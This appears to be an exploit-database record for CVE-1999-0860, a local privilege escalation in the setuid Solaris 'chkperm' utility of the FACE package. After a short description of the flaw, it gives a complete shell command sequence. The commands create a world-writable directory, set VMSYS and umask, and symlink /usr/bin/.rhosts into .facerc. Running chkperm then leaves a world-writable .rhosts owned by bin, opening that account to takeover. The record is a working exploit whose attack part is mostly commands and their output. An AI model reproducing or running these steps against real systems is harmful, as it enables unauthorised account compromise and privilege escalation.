    "text": "ecve : CVE-1999-0860 ， title : Solaris 7.0 - 'chkperm' Local Privilege Escalation - Solaris local Exploit ， verified : Verified ， exploit_detail : source :  ， Solaris 2.4 , 2.5 , and 2.5.1 ( possibly other versions ) have a package called FACE ( Framed Access Command Environment ) installed. Included in the package is a program called chkperm which checks a file to see if the user has permission to use the FACE interface. This program is installed suid and sgid bin , and is trivially exploitable to compromise the bin account under Solaris 2.4. ， Running chkperm in a directory that has world write privilege or in a directory that belongs to bin. chkperm on Solaris 2.5 seems to create a file called <gibberish characters> in the directory from where you execute it. chkperm needs write access for user bin ( or group bin ) to the directory from which you execute it. It also works the same with just 'chkperm -l' , you can set the environment variable VMSYS to anything. ， You could then create the link ( to .rhosts in the example ) using the <gibberish characters> file name created by chkperm and accomplish the same result. ， % mkdir /tmp/foo ， % mkdir /tmp/foo/lib ， % chmod -R 777 /tmp/foo ， % setenv VMSYS /tmp/foo ， % umask 0000 ， % ln -s /usr/bin/.rhosts /tmp/foo/lib/.facerc ， % /usr/vmsys/bin/chkperm -l -u foo ， % ls -l /usr/bin/.rhosts ， -rw-rw-rw- 2 bin bin 0 Nov 12 09 : 41 .rhosts",
